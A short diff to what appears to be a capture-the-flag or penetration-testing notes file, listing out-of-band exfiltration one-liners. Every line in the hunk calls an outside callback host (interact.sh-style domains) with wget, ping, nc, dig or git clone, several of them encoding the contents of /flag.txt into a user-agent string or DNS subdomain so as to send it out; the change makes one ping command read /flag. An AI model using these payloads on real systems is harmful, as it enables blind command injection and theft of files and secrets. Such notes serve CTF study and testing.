@@ -46,7 +46,7 @@ MySQL >=5.6
     wget -U `cat /flag.txt` xxxx.interct.sh
     wget `base64 -w0 /flag.txt`.xxxx.interct.sh
     ping here.xxx.interact.sh
-    ping $(head -c 32|base64|tr -d "="|tr "+" "-"|tr "/" ".").xxx.interact.sh
+    ping $(head -c 32 /flag|base64|tr -d "="|tr "+" "-"|tr "/" ".").xxx.interact.sh
     nc nchere.xxx.interact.sh 80
     dig dighere.xxx.interact.sh
     git clone githere.xxx.interact.sh
